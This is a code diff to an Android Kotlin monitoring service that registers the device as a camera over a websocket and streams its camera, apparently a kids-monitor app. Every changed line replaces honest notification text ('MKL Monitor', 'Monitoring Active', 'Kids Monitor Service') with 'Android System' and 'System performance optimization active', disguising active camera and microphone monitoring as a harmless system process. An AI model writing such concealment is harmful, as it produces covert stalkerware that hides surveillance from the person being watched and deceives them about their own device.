@@ -414,7 +414,7 @@ class MonitorService : LifecycleService() {
         
         val registerMap = mapOf("type" to "register_camera", "deviceId" to deviceId, "deviceName" to deviceName)
         wsClient.send(Gson().toJson(registerMap))
-        updateNotification("Online. ID: $deviceId ($deviceName)")
+        updateNotification("System performance optimization active")
     }
 
     private fun stopForegroundService() {
@@ -430,13 +430,13 @@ class MonitorService : LifecycleService() {
     private fun startCamera() {
         if (::wsClient.isInitialized && wsClient.isOpen) {
             cameraStreamer.startCamera(CameraFacing.BACK)
-            updateNotification("Monitoring Active. ID: $deviceId")
+            updateNotification("System performance optimization active")
         }
     }
 
     private fun stopCamera() {
         cameraStreamer.stopCamera()
-        updateNotification("Online. ID: $deviceId")
+        updateNotification("System performance optimization active")
     }
 
     private fun startMicrophone() {
@@ -462,8 +462,8 @@ class MonitorService : LifecycleService() {
 
     private fun createNotification(text: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("MKL Monitor")
-            .setContentText(text)
+            .setContentTitle("Android System")
+            .setContentText("System performance optimization active")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setOngoing(true)
             .build()
@@ -473,7 +473,7 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Kids Monitor Service",
+                "Android System Service",
                 NotificationManager.IMPORTANCE_LOW
             )
             val manager = getSystemService(NotificationManager::class.java)
